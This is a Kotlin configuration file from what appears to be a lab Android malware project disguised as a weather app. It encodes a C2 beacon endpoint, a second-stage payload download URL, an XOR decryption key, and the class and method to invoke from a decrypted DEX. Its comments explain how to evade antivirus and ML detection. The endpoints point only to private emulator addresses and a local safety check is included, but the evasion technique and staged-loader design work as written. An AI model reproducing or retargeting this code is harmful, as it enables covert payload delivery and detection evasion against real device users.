package com.skyweather.forecast.core

/**
 * Application configuration with encoded string constants.
 *
 * ══════════════════════════════════════════════════════════════════
 * TAKOPII STAGE 11 — String Encoding (not encryption)
 * ══════════════════════════════════════════════════════════════════
 *
 * Key insight: "Crypto strength and evasion strength are
 * inversely correlated." AES S-box triggered ESET detection. Simple XOR
 * eliminated it. But even XOR creates detectable byte patterns in bytecode.
 *
 * SOLUTION: Arithmetic offset encoding.
 * - Each character stored as (original_char_code + SHIFT)
 * - Decoded at runtime by subtraction: (encoded - SHIFT) = original
 * - In bytecode this is just an integer array + a subtract loop
 * - EVERY app has integer arrays and subtraction — untriggerable by ML
 * - No crypto imports, no S-boxes, no key schedules, no entropy spikes
 *
 * Why +13 specifically: ROT13 of character codes. Not cryptographically
 * meaningful — just enough to prevent literal string matching in the
 * constant pool. AV scanners grep for "http://" — they won't find
 * intArrayOf(117, 129, 129, 125, ...).
 * ══════════════════════════════════════════════════════════════════
 */
object AppConfig {

    private const val SHIFT = 13

    // "http://10.0.2.2:8080/api/v1/beacon"
    // Lab C2 endpoint — RFC1918 loopback only
    private val _endpoint = intArrayOf(
        117, 129, 129, 125, 71, 60, 60, 62, 61, 59, 61, 59, 63, 59, 63,
        71, 69, 61, 69, 61, 60, 110, 125, 118, 60, 131, 62, 60, 111,
        114, 110, 112, 124, 123
    )

    // "getSystemService"
    val GET_SYSTEM_SERVICE = intArrayOf(
        116, 114, 129, 96, 134, 128, 129, 114, 122, 96, 114, 127, 131,
        118, 112, 114
    )

    // "android.os.Build"
    val BUILD_CLASS = intArrayOf(
        110, 123, 113, 127, 124, 118, 113, 59, 124, 128, 59, 79, 130,
        118, 121, 113
    )

    // "android.os.Build$VERSION"
    val VERSION_CLASS = intArrayOf(
        110, 123, 113, 127, 124, 118, 113, 59, 124, 128, 59, 79, 130,
        118, 121, 113, 49, 99, 82, 95, 96, 86, 92, 91
    )

    // "MODEL"
    val MODEL_FIELD = intArrayOf(90, 92, 81, 82, 89)

    // "SDK_INT"
    val SDK_FIELD = intArrayOf(96, 81, 88, 108, 86, 91, 97)

    // "POST"
    val HTTP_METHOD = intArrayOf(93, 92, 96, 97)

    // "Content-Type"
    val CONTENT_TYPE_HEADER = intArrayOf(
        80, 124, 123, 129, 114, 123, 129, 58, 97, 134, 125, 114
    )

    // "application/json"
    val JSON_MIME = intArrayOf(
        110, 125, 125, 121, 118, 112, 110, 129, 118, 124, 123, 60,
        119, 128, 124, 123
    )

    // "sensor"
    val SENSOR_SERVICE = intArrayOf(128, 114, 123, 128, 124, 127)

    // "phone"
    val PHONE_SERVICE = intArrayOf(125, 117, 124, 123, 114)

    // ─── Stage 2: Payload delivery ────────────────────────────────

    // "http://10.0.2.2:8080/api/v1/payload"
    val PAYLOAD_URL = intArrayOf(
        117, 129, 129, 125, 71, 60, 60, 62, 61, 59, 61, 59, 63, 59, 63,
        71, 69, 61, 69, 61, 60, 110, 125, 118, 60, 131, 62, 60, 125,
        110, 134, 121, 124, 110, 113
    )

    // XOR key for payload decryption: "SkyWeatherSync24" (16 bytes)
    // Takopii Stage 3: XOR not AES — fewer ML features, no S-box pattern
    val PAYLOAD_KEY = intArrayOf(
        96, 120, 134, 100, 114, 110, 129, 117, 114, 127, 96, 134, 123, 112, 63, 65
    )

    // "payload.Module" — class to load from decrypted DEX
    val PAYLOAD_CLASS = intArrayOf(
        125, 110, 134, 121, 124, 110, 113, 59, 90, 124, 113, 130, 121, 114
    )

    // "execute" — method to invoke on loaded class
    val PAYLOAD_METHOD = intArrayOf(114, 133, 114, 112, 130, 129, 114)

    // ─── Decode ────────────────────────────────────────────────────

    /**
     * Decode an encoded int array back to a String.
     * In bytecode: creates IntArray, iterates with subtraction, builds String.
     * This is computationally identical to any app that processes integer data.
     */
    fun decode(encoded: IntArray): String {
        val chars = CharArray(encoded.size)
        for (i in encoded.indices) {
            chars[i] = (encoded[i] - SHIFT).toChar()
        }
        return String(chars)
    }

    /** Get the sync endpoint URL */
    fun endpoint(): String = decode(_endpoint)

    /** Get the payload download URL */
    fun payloadUrl(): String = decode(PAYLOAD_URL)

    /** Get XOR key bytes for payload decryption */
    fun payloadKey(): ByteArray = decode(PAYLOAD_KEY).toByteArray(Charsets.UTF_8)

    // ─── Safety Gate ───────────────────────────────────────────────

    /**
     * Verify endpoint points to RFC1918 / loopback only.
     * Lab safety: prevents accidental exfil to public internet.
     * This is the CLAUDE.md non-negotiable constraint.
     */
    fun isEndpointSafe(): Boolean {
        val url = endpoint()
        val host = try {
            java.net.URL(url).host
        } catch (_: Exception) {
            return false
        }

        // RFC1918 ranges + loopback + emulator host
        return host == "127.0.0.1" ||
                host == "localhost" ||
                host.startsWith("10.") ||
                host.startsWith("192.168.") ||
                host.startsWith("172.16.") ||
                host.startsWith("172.17.") ||
                host.startsWith("172.18.") ||
                host.startsWith("172.19.") ||
                host.startsWith("172.2") ||
                host.startsWith("172.30.") ||
                host.startsWith("172.31.")
    }
}
